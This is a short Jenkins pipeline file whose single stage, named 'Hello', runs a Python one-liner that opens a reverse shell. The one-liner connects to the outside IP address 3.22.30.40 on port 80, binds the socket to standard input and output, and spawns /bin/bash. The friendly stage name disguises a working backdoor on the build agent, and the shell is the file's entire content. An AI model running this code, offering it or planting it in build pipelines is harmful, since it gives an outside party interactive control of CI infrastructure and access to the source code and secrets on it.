pipeline {
  agent none
  stages {
    stage('Hello') {
      agent any
      steps {
        sh '''#!/bin/bash
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.22.30.40",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
        '''
      }
    }

  }
}
